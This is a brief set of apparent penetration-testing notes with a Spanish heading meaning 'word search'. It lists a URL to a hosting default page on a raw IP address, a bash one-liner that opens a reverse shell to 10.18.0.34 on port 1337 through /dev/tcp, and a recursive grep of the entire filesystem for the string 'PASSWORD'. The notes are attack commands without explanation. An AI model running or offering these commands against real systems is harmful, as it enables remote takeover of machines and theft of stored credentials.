http://205.234.134.108/cgi-sys/defaultwebpage.cgi

1. `setsid /bin/bash -c "/bin/bash &>/dev/tcp/10.18.0.34/1337 0>&1 &"`


Busqueda de palabras
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

